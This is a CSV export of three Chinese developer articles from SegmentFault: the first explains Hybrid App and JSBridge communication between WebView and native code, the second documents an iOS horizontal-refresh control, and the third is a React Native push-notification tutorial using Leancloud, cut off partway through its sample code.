ID,已采,已发,pid,content,title,date,view,comment,thumbs,userid,type,PageUrl
1,1,0,6,"
                    
<h2>引言</h2>
<p>随着 Web 技术和移动设备的快速发展，Hybrid 技术已经成为一种最主流最常见的方案。一套好的 Hybrid架构方案 能让 App 既能拥有极致的体验和性能，同时也能拥有 Web技术 灵活的开发模式、跨平台能力以及热更新机制，想想是不是都鸡冻不已。。😄。本系列文章是公司在这方面实践的一个总结，包含了原理解析、方案选型与实现、实践优化等方面。</p>
<p>大家可以到<a href=""https://github.com/xd-tayde/blog/blob/master/hybrid-1.md"" rel=""nofollow noreferrer"">github</a>上和我进行讨论哈！</p>
<h2>现有混合方案</h2>
<p>Hybrid App，俗称混合应用，即混合了 Native技术 与 Web技术 进行开发的移动应用。现在比较流行的混合方案主要有三种，主要是在UI渲染机制上的不同：</p>
<ol>
<li>基于 <strong>WebView UI</strong> 的基础方案，市面上大部分主流 App 都有采用，例如微信JS-SDK，通过 JSBridge 完成 H5 与 Native 的双向通讯，从而赋予H5一定程度的原生能力。</li>
<li>基于 <strong>Native UI</strong> 的方案，例如 React-Native、Weex。在赋予 H5 原生API能力的基础上，进一步通过 JSBridge 将js解析成的虚拟节点树(Virtual DOM)传递到 Native 并使用原生渲染。</li>
<li>另外还有近期比较流行的<strong>小程序方案</strong>，也是通过更加定制化的 JSBridge，并使用双 WebView 双线程的模式隔离了JS逻辑与UI渲染，形成了特殊的开发模式，加强了 H5 与 Native 混合程度，提高了页面性能及开发体验。</li>
</ol>
<p>以上的三种方案，其实同样都是基于 JSBridge 完成的通讯层，第二三种方案，其实可以看做是在方案一的基础上，继续通过不同的新技术进一步提高了应用的混合程度。因此，JSBridge 也是整个混合应用最关键的部分，例如我们在设置微信分享时用到的 JS-SDK，wx对象 便是我们最常见的 JSBridge:</p>
<p><span class=""img-wrap""><img data-src=""/img/bVbdWKL?w=848&amp;h=770"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>方案选型</h2>
<p>任何技术方案的选型，其实都应该基于使用场景和现有条件。基于公司现有情况的几点考虑，在方案一上进一步优化，更加适合我们的需求。</p>
<ul>
<li>需求 Web技术 快速迭代、灵活开发的特点和线上热更新的机制。</li>
<li>产品的核心能力是强大的拍照与底层图片处理能力，因此单纯的 H5技术能做的事非常有限，不能满足需求，通过 Hybrid 技术来强化H5，便是一种必需。</li>
<li>公司业务上，并没有非常复杂的UI渲染需求，而且 App 中的一系列原生 UI组件 已经非常成熟，因此我们并不强需类似 RN 这样的方案。</li>
</ul>
<p>因此，<strong>如何既能利用 H5 强大的开发和迭代能力，又能赋予 H5 强大的底层能力和用户体验，同时能复用现有的成熟 Native组件</strong>，便成为了我们最大的需求点 -- 一套完整又强大的 Hybrid技术架构方案。😠</p>
<h2>Hybrid技术原理</h2>
<p>Hybrid App的本质，其实是在原生的 App 中，使用 WebView 作为容器直接承载 Web页面。因此，最核心的点就是 Native端 与 H5端 之间的<strong>双向通讯层</strong>，其实这里也可以理解为我们需要一套<strong>跨语言通讯方案</strong>，来完成 Native(Java/Objective-c/...) 与 JavaScript 的通讯。这个方案就是我们所说的 JSBridge，而实现的关键，便是作为容器的 WebView，一切的原理都是基于 WebView 的机制。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVbdWLt?w=608&amp;h=688"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h3>(一) JavaScript 通知 Native</h3>
<p>基于 WebView 的机制和开放的 API, 实现这个功能有三种常见的方案：</p>
<ul>
<li>
<strong>API注入</strong>，原理其实就是 Native 获取 JavaScript环境上下文，并直接在上面挂载对象或者方法，使 js 可以直接调用，Android 与 IOS 分别拥有对应的挂载方式。</li>
<li>
<strong>WebView 中的 prompt/console/alert 拦截</strong>，通常使用 prompt，因为这个方法在前端中使用频率低，比较不会出现冲突；</li>
<li>
<strong>WebView URL Scheme 跳转拦截</strong>；</li>
</ul>
<p>第二三种机制的原理是类似的，都是通过对 WebView 信息冒泡传递的拦截，从而达到通讯的，接下来我们主要从 <strong>原理-定制协议-拦截协议-参数传递-回调机制</strong> 5个方面详细阐述下第三种方案 -- URL拦截方案。</p>
<h4>1. 实现原理</h4>
<p><strong>在 WebView 中发出的网络请求，客户端都能进行监听和捕获</strong></p>
<h4>2. 协议的定制</h4>
<p>我们需要制定一套<strong>URL Scheme</strong>规则，通常我们的请求会带有对应的协议开头，例如常见的 <a href=""https://xxx.com"" rel=""nofollow noreferrer"">https://xxx.com</a> 或者 file://1.jpg，代表着不同的含义。我们这里可以将协议类型的请求定制为:</p>
<blockquote>xxcommand://xxxx?param1=1&amp;param2=2</blockquote>
<p>这里有几个需要注意点的是:</p>
<p>(1) xxcommand:// 只是一种规则，可以根据业务进行制定，使其具有含义，例如我们定义 xxcommand:// 为公司所有App系通用，为通用工具协议：</p>
<blockquote>xxcommand://getProxy?h=1</blockquote>
<p>而定义 xxapp:// 为每个App单独的业务协议。</p>
<blockquote>xxapp://openCamera?h=2</blockquote>
<p><strong>不同的协议头代表着不同的含义，这样便能清楚知道每个协议的适用范围。</strong></p>
<p>(2) 这里不要使用 location.href 发送，因为其自身机制有个问题是同时并发多次请求会被合并成为一次，导致协议被忽略，而并发协议其实是非常常见的功能。我们会使用<strong>创建 iframe 发送请求</strong>的方式。</p>
<p>(3) 通常考虑到安全性，需要在客户端中设置域名白名单或者限制，避免公司内部业务协议被第三方直接调用。</p>
<h4>3.协议的拦截</h4>
<p>客户端可以通过 API 对 WebView 发出的请求进行拦截：</p>
<ul>
<li>IOS上: shouldStartLoadWithRequest</li>
<li>Android: shouldOverrideUrlLoading</li>
</ul>
<p>当解析到请求 URL 头为制定的协议时，便不发起对应的资源请求，而是解析参数，并进行相关功能或者方法的调用，完成协议功能的映射。</p>
<h4>4.协议回调</h4>
<p>由于协议的本质其实是发送请求，这属于一个异步的过程，因此我们便需要处理对应的回调机制。这里我们采用的方式是JS的事件系统，这里我们会用到 <code>window.addEventListener</code> 和 <code>window.dispatchEvent</code>这两个基础API；</p>
<ul>
<li><ol><li>发送协议时，通过协议的唯一标识注册自定义事件，并将回调绑定到对应的事件上。</li></ol></li>
<li><ol><li>客户端完成对应的功能后，调用 Bridge 的dispatch API，直接携带 data 触发该协议的自定义事件。</li></ol></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVbdZrR?w=1494&amp;h=968"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>通过事件的机制，会让开发更符合我们前端的习惯，例如当你需要监听客户端的通知时，同样只需要在通过 <code>addEventListener</code> 进行监听即可。</p>
<p><strong>Tips:</strong> 这里有一点需要注意的是，应该避免事件的多次重复绑定，因此当唯一标识重置时，需要<code>removeEventListener</code>对应的事件。</p>
<h4>5.参数传递方式</h4>
<p>由于 WebView 对 URL 会有长度的限制，因此常规的通过 search参数 进行传递的方式便具有一个问题，既 <strong>当需要传递的参数过长时，可能会导致被截断</strong>，例如传递base64或者传递大量数据时。</p>
<p>因此我们需要制定新的参数传递规则，我们使用的是函数调用的方式。这里的原理主要是基于:</p>
<blockquote>Native 可以直接调用 JS 方法并直接获取函数的返回值。</blockquote>
<p>我们只需要对每条协议标记一个唯一标识，并把参数存入参数池中，到时客户端再通过该唯一标识从参数池中获取对应的参数即可。</p>
<h3>(二) Native 通知 Javascript</h3>
<p>由于 Native 可以算作 H5 的宿主，因此拥有更大的权限，上面也提到了 <strong>Native 可以通过 WebView API直接执行 Js 代码</strong>。这样的权限也就让这个方向的通讯变得十分的便捷。</p>
<ul><li>IOS: stringByEvaluatingJavaScriptFromString</li></ul>
<pre><code class=""js"">// Swift
webview.stringByEvaluatingJavaScriptFromString(""alert('NativeCall')"")</code></pre>
<ul><li>Android: loadUrl (4.4-)</li></ul>
<pre><code class=""js"">// 调用js中的JSBridge.trigger方法
// 该方法的弊端是无法获取函数返回值；
webView.loadUrl(""javascript:JSBridge.trigger('NativeCall')"")</code></pre>
<p><strong>Tips:</strong> 当系统低于4.4时，evaluateJavascript 是无法使用的，因此单纯的使用 loadUrl 无法获取 JS 返回值，这时我们需要使用前面提到的 prompt 的方法进行兼容，让 H5端 通过 prompt 进行数据的发送，客户端进行拦截并获取数据。</p>
<ul><li>Android: evaluateJavascript (4.4+)</li></ul>
<pre><code class=""js"">// 4.4+后使用该方法便可调用并获取函数返回值；
mWebView.evaluateJavascript（""javascript:JSBridge.trigger('NativeCall')"",      new ValueCallback&lt;String&gt;() {
    @Override
    public void onReceiveValue(String value) {
        //此处为 js 返回的结果
    }
});</code></pre>
<p>基于上面的原理，我们已经明白 JSBridge 最基础的原理，并且能实现 Native &lt;=&gt; H5 的双向通讯机制了。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVbdWKZ?w=820&amp;h=502"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h3>(三) JSBridge 的接入</h3>
<p>接下来，我们来理下代码上需要的资源。实现这套方案，从上图可以看出，其实可以分为两个部分:</p>
<ul>
<li>JS部分(bridge): 在JS环境中注入 bridge 的实现代码，包含了协议的拼装/发送/参数池/回调池等一些基础功能。</li>
<li>Native部分(SDK)：在客户端中 bridge 的功能映射代码，实现了URL拦截与解析/环境信息的注入/通用功能映射等功能。</li>
</ul>
<p>我们这里的做法是，将这两部分一起封装成一个 <strong>Native SDK</strong>，由客户端统一引入。客户端在初始化一个 WebView 打开页面时，如果页面地址在白名单中，会<strong>直接在 HTML 的头部注入对应的 bridge.js</strong>。这样的做法有以下的好处：</p>
<ul>
<li>双方的代码统一维护，避免出现版本分裂的情况。有更新时，只要由客户端更新SDK即可，不会出现版本兼容的问题；</li>
<li>App的接入十分方便，只需要按文档接入最新版本的SDK，即可直接运行整套Hybrid方案，便于在多个App中快速的落地；</li>
<li>H5端无需关注，这样有利于将 bridge 开放给第三方页面使用。</li>
</ul>
<p>这里有一点需要注意的是，<strong>协议的调用，一定是需要确保执行在bridge.js 成功注入后</strong>。由于客户端的注入行为属于一个附加的异步行为，从H5方很难去捕捉准确的完成时机，因此这里需要通过客户端监听页面完成后，基于上面的回调机制通知 H5端，页面中即可通过<code>window.addEventListener('bridgeReady', e =&gt; {})</code>进行初始化。</p>
<h3>(四) App中 H5 的接入方式</h3>
<p>将 H5 接入 App 中通常有两种方式： </p>
<p>(1) <strong>在线H5</strong>，这是最常见的一种方式。我们只需要将H5代码部署到服务器上，只要把对应的 URL地址 给到客户端，用 WebView 打开该URL，即可嵌入。该方式的好处在于:</p>
<ul>
<li>独立性强，有非常独立的开发/调试/更新/上线能力；</li>
<li>资源放在服务器上，完全不会影响客户端的包体积；</li>
<li>接入成本很低，完全的热更新机制。</li>
</ul>
<p>但相对的，这种方式也有对应的缺点:</p>
<ul>
<li>完全的网络依赖，在离线的情况下无法打开页面；</li>
<li>首屏加载速度依赖于网络，网络较慢时，首屏加载也较慢；</li>
</ul>
<p>通常，这种方式更适用在一些比较轻量级的页面上，例如一些帮助页、提示页、使用攻略等页面。这些页面的特点是<strong>功能性不强，不太需要复杂的功能协议，且不需要离线使用</strong>。在一些第三方页面接入上，也会使用这种方式，例如我们的页面调用微信JS-SDK。</p>
<p>(2) <strong>内置包H5</strong>，这是一种本地化的嵌入方式，我们需要将代码进行打包后下发到客户端，并由客户端直接解压到本地储存中。通常我们运用在一些比较大和比较重要的模块上。其优点是:</p>
<ul>
<li>由于其本地化，首屏加载速度快，用户体验更为接近原生；</li>
<li>可以不依赖网络，离线运行；</li>
</ul>
<p>但同时，它的劣势也十分明显:</p>
<ul>
<li>开发流程/更新机制复杂化，需要客户端，甚至服务端的共同协作；</li>
<li>会相应的增加 App 包体积；</li>
</ul>
<p>这两种接入方式均有自己的优缺点，应该根据不同场景进行选择。</p>
<h2>总结</h2>
<p>本文主要解析了现在Hybrid App的发展现状和其基础原理，包含了</p>
<ul>
<li>JavaScript 通知 Native</li>
<li>Native 通知 Javascript</li>
<li>JSBridge 的接入</li>
<li>H5 的接入</li>
</ul>
<p>只有在了解了其最本质的实现原理后，才能对这套方案进行实现以及进一步的优化。接下来，我们将基于上面的理论，继续探讨如何把这套方案的真正代码实现以及方案优化方案，欢迎大家一起讨论！更多文章内容请到<a href=""https://github.com/xd-tayde/blog/blob/master/hybrid-1.md"" rel=""nofollow noreferrer"">github</a>。感谢！😊</p>

                ", Hybrid App技术解析 -- 原理篇,1531971850,107,1,795,1,1,https://segmentfault.com/a/1190000015678155
2,1,0,6,"
                    
<p><a href=""https://www.dandj.top/2018/07/13/%E4%B8%80%E6%AC%BE%E7%AE%80%E5%8D%95%E5%A5%BD%E7%94%A8%E7%9A%84UICollectionView%E6%A8%AA%E5%90%91%E6%BB%9A%E5%8A%A8%E5%88%B7%E6%96%B0%E6%8E%A7%E4%BB%B6/"" rel=""nofollow noreferrer"">点我跳转原文</a><br><a href=""https://github.com/dangercheng/CollectionViewSideRefresh"" rel=""nofollow noreferrer"">源码地址:(GitHub)</a></p>
<h1>实现功能：</h1>
<ul>
<li><strong>接入简单，不侵入代码</strong></li>
<li><strong>右拉刷新，左拉加载更多</strong></li>
<li><strong>自定义提示文案和加载动画</strong></li>
<li><strong>方便隐藏和显示加载提示文本和动画</strong></li>
</ul>
<h1>接入方式</h1>
<ol>
<li>下载源码，将文件夹 ""SideRefresh""添加进工程</li>
<li>引入头文件 #import ""UICollectionView+SideRefresh.h""</li>
<li>创建SideRefreshHeader和SideRefreshFooter并添加给UICollectionView即可</li>
</ol>
<h2>默认刷新样式</h2>
<pre><code>SideRefreshHeader *refreshHeader = [SideRefreshHeader refreshWithLoadAction:^{
    //执行刷新
}];
self.collectionView.sideRefreshHeader = refreshHeader;

SideRefreshFooter *refreshFooter = [SideRefreshFooter refreshWithLoadAction:^{
    //执行加载更多
}];
self.collectionView.sideRefreshFooter = refreshFooter;</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bVbdKjd?w=315&amp;h=560"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""默认样式"" title=""默认样式""></span></p>
<h2>自定义刷新提示和图片动画</h2>
<pre><code>SideRefreshHeader *refreshHeader = [SideRefreshHeader refreshWithLoadAction:^{
    //执行刷新
}];
NSMutableArray *loadingImages = [NSMutableArray array];
for(int i = 1; i &lt;= 9; i++) {
    UIImage *loadingImg = [UIImage imageNamed:[NSString stringWithFormat:@""loading_0%d"", i]];
    if(loadingImg) {
        [loadingImages addObject:loadingImg];
    }
}
refreshHeader.loadingImages = loadingImages;//自定义图片动画
//自定义提示文案
refreshHeader.normalMessage = @""再拉我试试!"";
refreshHeader.pullingMessage = @""松开，松开"";
refreshHeader.loadingMessage = @""奔跑..."";
self.collectionView.sideRefreshHeader = refreshHeader;

SideRefreshFooter *refreshFooter = [SideRefreshFooter refreshWithLoadAction:^{
    //执行加载更多
}];
self.collectionView.sideRefreshFooter = refreshFooter;</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bVbdKjx?w=315&amp;h=560"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""自定义.png"" title=""自定义.png""></span></p>
<h2>隐藏刷新提示或动画</h2>
<pre><code>SideRefreshHeader *refreshHeader = [SideRefreshHeader refreshWithLoadAction:^{
    //执行刷新
}];
refreshHeader.hideMessage = YES;//隐藏提示
self.collectionView.sideRefreshHeader = refreshHeader;

SideRefreshFooter *refreshFooter = [SideRefreshFooter refreshWithLoadAction:^{
    //执行加载更多
}];
refreshFooter.hideIndicator = YES;//隐藏加载动画
self.collectionView.sideRefreshFooter = refreshFooter;</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bVbdKjD?w=315&amp;h=560"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""隐藏提示或动画.png"" title=""隐藏提示或动画.png""></span></p>
<h1>实现方式</h1>
<ul>
<li><strong>通过Runtime为UICollectionView添加SideRefreshHeader和SideRefreshFooter属性</strong></li>
<li><strong>观察UICollectionView的contentOffset实现拖动相关逻辑</strong></li>
<li><strong>观察UICollectionView的contentSize来重置刷新视图</strong></li>
<li>更多细节参见源码</li>
</ul>
<p>如果觉得好用欢迎Star <a href=""https://github.com/dangercheng/CollectionViewSideRefresh"" rel=""nofollow noreferrer"">github</a>, 使用问题请Issue。</p>

                ", 一款简单好用的UICollectionView横向滚动刷新控件,1531971852,326,1,253,1,1,https://segmentfault.com/a/1190000015630358
3,1,0,6,"
                    
<h1>前言</h1>
<p>React Native现在是越来越火，一套代码同时构建iOS、Android两种应用真的是太爽了，而且有了ES6和React的加成开发效率出奇的高。 虽然坑奇多无比但是还是阻挡不了市场对它的热爱。但是使用React Native也并非总是那么舒服，尤其涉及到需要用objective-c或者java实现某些原生功能的时候，让广大前端出生没有原生App开发经验的同学们苦不堪言，但是没有办法，硬着头皮写下去总比丢工作强。所以React Native开发者们真的是痛并快乐着，爽并纠结着。然而能力就是在这个过程中快速提高的，所以大家加油，现在只不过是黎明前的黑暗！</p>
<p>今天要分享的是我在React Native开发过程中征服的一个小小领域：消息推送。</p>
<p>其实做手机App就绕不开消息推送，没有消息推送的App就像一个没有漂亮前台的公司（就像我们公司，嘿嘿），让人没有进去看看的欲望。。怎么可能火呢。</p>
<p>说正经的，虽然我做完React Native版的消息推送之后发现其实也并不难，但是一路上踩过大大小小的坑、尝试过无数的解决方案，到最终大功告成还是有点小成就感的（笨人获得满足感相对比较容易）。实现React Native App的消息推送可预见的难点在于：</p>
<ol>
<li>在众多的第三方推送服务提供商中选择哪一个最合适</li>
<li>需要同时实现Android和IOS两个系统的推送，需要对两个系统的推送机制都非常熟悉</li>
<li>哪些部分需要用原生实现，哪些需要用js实现，如何实现桥接</li>
<li>如何实现App在后台或者关闭（inactive）状态下的推送，又如何实现App打开（active）状态下的消息推送</li>
</ol>
<p>结下来我就针对以上的难点，并结合实际的项目来详细分析如何实现消息推送。</p>
<h1>选择服务提供商</h1>
<p>市场上的推送服务提供商有很多，比如友盟、极光推送、Leancloud、个推、环信、融云等等。这么多的选择我们不可能都用过，所以应该从哪些方面去考量呢？</p>
<ol>
<li>首先，必须支持React Native。为了验证这些第三方服务是否支持React Native，没有特别好的办法，我只能一个个的看他们的官网文档。如果文档里面都没有提到React Native那么果断放弃（有些厂商都不提供文档搜索功能，那也不建议选择，以后出问题都不好找）。</li>
<li>推送服务要稳定、可靠、快速，这一点不太好判断，因为大家都说自己可靠快速，所以需要实际使用后才能判断。</li>
<li>文档完善、清晰、准确、更新及时，能提供官方的React Native推送Demo。</li>
<li>价格合理（我们还是要想办法为公司省点钱滴）。</li>
</ol>
<p>下面是我整理的一些主流的推送服务提供商的对比，可能不是那么完善和客观，欢迎纠错，没有提到的厂商不好意思啦。。</p>
<table>
<thead><tr>
<th>服务商</th>
<th>React Native支持否</th>
<th>文档质量</th>
<th>官方Demo</th>
<th>价格</th>
</tr></thead>
<tbody>
<tr>
<td>友盟</td>
<td>是</td>
<td>差，放弃</td>
<td>未调查</td>
<td>未调查</td>
</tr>
<tr>
<td>极光</td>
<td>是</td>
<td>缺少</td>
<td><a href=""https://github.com/jpush/jpush-react-native"" rel=""nofollow noreferrer"">Demo</a></td>
<td><a href=""https://www.jiguang.cn/push-price"" rel=""nofollow noreferrer"">价格</a></td>
</tr>
<tr>
<td>Leancloud</td>
<td>是</td>
<td>高</td>
<td><a href=""https://github.com/leancloud/react-native-installation-demo"" rel=""nofollow noreferrer"">iOS</a></td>
<td><a href=""https://leancloud.cn/pricing/"" rel=""nofollow noreferrer"">价格</a></td>
</tr>
<tr>
<td>腾讯信鸽</td>
<td>否（未找到相关文档）</td>
<td>/</td>
<td>/</td>
<td>/</td>
</tr>
<tr>
<td>阿里云推送</td>
<td>否（未找到相关文档）</td>
<td>/</td>
<td>/</td>
<td>/</td>
</tr>
<tr>
<td>百度云推送</td>
<td>否（未找到相关文档）</td>
<td>/</td>
<td>/</td>
<td>/</td>
</tr>
<tr>
<td>网易云信</td>
<td>是</td>
<td>缺少</td>
<td><a href=""https://github.com/netease-im/NIM_ReactNative_Demo"" rel=""nofollow noreferrer"">Demo</a></td>
<td><a href=""http://netease.im/price"" rel=""nofollow noreferrer"">价格</a></td>
</tr>
<tr>
<td>云巴</td>
<td>否（未找到相关文档）</td>
<td>/</td>
<td>/</td>
<td>/</td>
</tr>
<tr>
<td>个推</td>
<td>是</td>
<td>缺少</td>
<td><a href=""https://github.com/GetuiLaboratory/react-native-getui"" rel=""nofollow noreferrer"">Demo</a></td>
<td><a href=""http://www.getui.com/cn/getui.html"" rel=""nofollow noreferrer"">价格</a></td>
</tr>
<tr>
<td>环信</td>
<td>否（只支持IM）</td>
<td>/</td>
<td>/</td>
<td>/</td>
</tr>
<tr>
<td>融云</td>
<td>否（未找到相关文档）</td>
<td>/</td>
<td>/</td>
<td>/</td>
</tr>
</tbody>
</table>
<p>以上所有的厂商里面只有4家是支持React Native消息推送的，BAT跟商量好了似的都不支持，难道集体看衰React Native吗？在仅有的4家厂商中，文档方面只有Leancloud一家是我觉得文档质量比较好的，其他厂商都缺少接入React Native的相关文档。个推只有一个小Demo，而且Demo的文档也很简陋，所以先排除。极光的Demo应该是做的最好的，star数最多，Demo文档看起来也写的挺好的，虽然没有明码标价，但是免费版貌似就够用了，推送次数没有上限，二十万条/秒的推送速度也够用了，做一般应用应该足够了。网易的Demo看起来也挺完善，文档也说的过去，关键是价格太贵啦，商用版1800/月。。为了只做一个推送不值得，放弃！最后Leancloud是我个人比较喜欢的，因为之前有项目用到过，不管是文档、SDK的易用性、服务的可靠性和速度还是网站的审美都可以算得上同行中的佼佼者，而且商用版30/天的价格也可以接收（30/天包含了除推送外其他更多的功能和服务）。所以总结下来，只有极光推送和Leancloud值得一用（欢迎极光和Leancloud联系我打赏，嘿嘿），由于我的个人偏好，最终选择了使用Leancloud。</p>
<h1>消息推送概念普及</h1>
<p>我们在实现具体项目之前还是有必要了解一下消息推送的相应机制和基本概念的，这里我就不赘述了，欢迎阅读Leancloud的 <a href=""https://leancloud.cn/docs/push_guide.html"" rel=""nofollow noreferrer"">消息推送服务总览</a>。</p>
<h1>接入Leancloud</h1>
<p>首先我们创建一个React Native项目（<a href=""https://github.com/MudOnTire/LeancloudPushDemo"" rel=""nofollow noreferrer"">本文Demo地址</a>）：</p>
<pre><code>react-native init LeancloudPushDemo</code></pre>
<p>并在Leancloud创建一个同名应用，开发版就好：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614722?w=1536&amp;h=610"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p>安装完成后，我们需要安装Leancloud推送相关的js sdk：</p>
<pre><code>$ npm install leancloud-storage --save

$ npm install leancloud-installation --save</code></pre>
<p>我们在项目根目录下创建services文件夹，并在其中添加PushService.js文件，用于管理消息推送的主要逻辑，初始内容如下：</p>
<pre><code>import AV from 'leancloud-storage';

const appId = 'ppdriT1clcnRoda0okCPaB48-gzGzoHsz';
const appKey = 'Qzarq5cMdWzAMjwDW4umWpBL';

AV.init({
    appId: appId,
    appKey: appKey
});

const Installation = require('leancloud-installation')(AV);

class PushService {

}

export default new PushService();</code></pre>
<p>目前PushService还是一个空的class，稍后我们会逐渐丰富它的功能。<br>Leancloud的AppId，AppKey可以在如下页面获取：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614723?w=1864&amp;h=980"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p>由于iOS、Android推送方式的差异，接下来我们将分别进行实现。</p>
<h1>iOS消息推送</h1>
<p>在React Native中实现iOS的消息推送相对Android简单一些，因为官方已经给出了<code>PushNotificationIOS</code>这样现成的组件。</p>
<h2>配置</h2>
<p>首先，根据，在iOS 项目中引入 RCTPushNotification，可参考：<a href=""https://facebook.github.io/react-native/docs/linking-libraries-ios.html#content"" rel=""nofollow noreferrer"">Linking Libraries - React Native docs</a></p>
<h3>步骤1：将PushNotification项目拖到当前iOS主项目</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614724?w=2570&amp;h=860"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<h3>步骤2：添加libRCTPushNotification静态库</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614725?w=1896&amp;h=1186"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<h3>步骤3: 开启Push Notification功能</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614726?w=1920&amp;h=724"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p>然后，修改AppDelegate.m，增加推送相关事件代理，可参考：<a href=""https://facebook.github.io/react-native/docs/pushnotificationios.html#content"" rel=""nofollow noreferrer"">PushNotificationIOS - React Native docs</a>，。</p>
<h2>获取devideToken，更新_Installation表</h2>
<p>Leancloud需要根据iOS设备的deviceToken来决定推送到哪台设备，所以需要把deviceToken保存到_Installation表。而保存的最佳时机就在App刚刚启动的时候，在PushService下添加如下代码：</p>
<pre><code>//引用PushNotificationIOS
const PushNotificationIOS = require('react-native').PushNotificationIOS;

...

class PushService {
    //获取iOS消息通知权限
    _iOS_initPush = () =&gt; {
        PushNotificationIOS.addEventListener('register', this._iOS_onRegister);
        PushNotificationIOS.requestPermissions();
    }

    //权限获取成功回调
    _iOS_onRegister = (deviceToken) =&gt; {
        if (deviceToken) {
            this._iOS_saveInstallation(deviceToken);
        }
    }

    //保存deviceToken到Installation
    _iOS_saveInstallation = (deviceToken) =&gt; {
        const info = {
            apnsTopic: 'com.example',
            deviceType: 'ios',
            deviceToken: deviceToken
        };
        Installation.getCurrent()
            .then(installation =&gt; installation.save(info))
            .then(result =&gt; console.log(result))
            .catch(error =&gt; console.error(error))
    }
}

...</code></pre>
<p>修改App.js，在<code>componentDidMount</code>时执行初始化：</p>
<pre><code>import React, { Component } from 'react';
import { Text, View } from 'react-native';
import PushService from './services/PushService';

type Props = {};
export default class App extends Component&lt;Props&gt; {

  componentDidMount() {
    PushService._iOS_initPush();
  }

  render() {
    return (
      &lt;View&gt;
        &lt;Text&gt;Leancloud Push Demo&lt;/Text&gt;
      &lt;/View&gt;
    );
  }
}</code></pre>
<p>现在我们来运行一下项目（须使用真机，模拟器获取不到deviceToken），看是否能获取到deviceToken并保存。</p>
<p>保存成功后发现_Installation表中多了一条记录：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614727?w=1886&amp;h=582"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<h2>推送证书设置</h2>
<p>成功保存deviceToken意味着我们已经成功了一半了，但如果要让iOS设备能收到通知，还需要配置推送证书，详细步骤请参考 <a href=""https://leancloud.cn/docs/ios_push_cert.html"" rel=""nofollow noreferrer"">iOS推送证书设置指南</a>。推荐使用Token Authentication。</p>
<p>推送证书设置完成之后，就可以测试手机是否能收到消息通知了。Leancloud提供在线发送消息的功能：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015614728?w=2430&amp;h=1606"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p>在线发送之后，手机就可以收到通知了（不小心暴露我的起床时间了。。）：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614729?w=842&amp;h=316"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<h2>通知的接收和处理</h2>
<p>到目前为止我们已经成功了一大半了，但是我们还想做得更多一点，一款成熟的应用还应该包括以下功能：</p>
<ul>
<li>App在前台、后台运行或者关闭状态都能看到通知消息</li>
<li>App在后台或者关闭状态收到通知，App图标能显示通知个数的badge</li>
<li>点击通知能够进行自定义的操作，比如跳转到具体页面</li>
</ul>
<h3>App打开时通知的显示</h3>
<p>当App在前台运行时收到通知iOS默认是不会提醒的（iOS 10开始支持在前台显示，请参考 <a href=""https://stackoverflow.com/questions/14872088/get-push-notification-while-app-in-foreground-ios"" rel=""nofollow noreferrer"">stackoverflow</a>），因此我们需要自己实现接收通知并显示的逻辑。</p>
<p>我们选择用 <a href=""https://github.com/KBLNY/react-native-message-bar"" rel=""nofollow noreferrer"">react-native-message-bar</a>来展示通知，先安装react-native-message-bar：</p>
<pre><code>npm install react-native-message-bar --save</code></pre>
<p>然后，在App.js中引入并注册MessageBar：</p>
<pre><code>...

const MessageBarAlert = require('react-native-message-bar').MessageBar;
const MessageBarManager = require('react-native-message-bar').MessageBarManager;

...

componentDidMount() {
    PushService._iOS_initPush();
    MessageBarManager.registerMessageBar(this.refs.alert);
}

componentWillUnmount() {
    PushNotificationIOS.removeEventListener('register');
    MessageBarManager.unregisterMessageBar();
}

render() {
return (
  &lt;View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}&gt;
    &lt;Text style={{ fontSize: 24 }}&gt;Leancloud Push Demo&lt;/Text&gt;
    &lt;MessageBarAlert ref=""alert"" /&gt;
  &lt;/View&gt;
);
}

...</code></pre>
<p>接着，修改PushService，增加对<code>notification</code>事件的监听，和显示自定义Alert的方法：</p>
<pre><code>...

_iOS_initPush = () =&gt; {
    PushNotificationIOS.addEventListener('register', this._iOS_onRegister);
    PushNotificationIOS.addEventListener('notification', this._iOS_onNotification);
    PushNotificationIOS.requestPermissions();
}

_iOS_onNotification = (notification) =&gt; {
    //如果app在前台则显示alert
    if (AppState.currentState === 'active') {
        this._showAlert(notification._alert);
